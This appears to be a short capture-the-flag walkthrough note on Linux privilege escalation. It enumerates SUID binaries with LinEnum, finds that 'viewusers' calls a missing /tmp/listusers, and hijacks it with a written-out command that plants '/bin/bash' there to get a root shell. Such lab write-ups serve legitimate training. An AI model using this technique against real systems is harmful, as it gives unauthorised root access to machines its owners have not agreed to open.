User is owned! 

Upload LinEnum.sh with python SimpleHTTPServer
Run LinEnum with thorough tests, find SUID executables
This yields the executable 'viewusers'
This file will thus always be executed as root, even if ran by non-priv user
Run 'viewuser' in shell and see all active shell sessions + an error:
	'sh: 1: /tmp/listusers: not found'
	This indicates the executable is looking for a shell command in file /tmp/listusers
echo '/bin/bash' > /tmp/listusers; viewusers
whoami -> root
You are now root! :-)
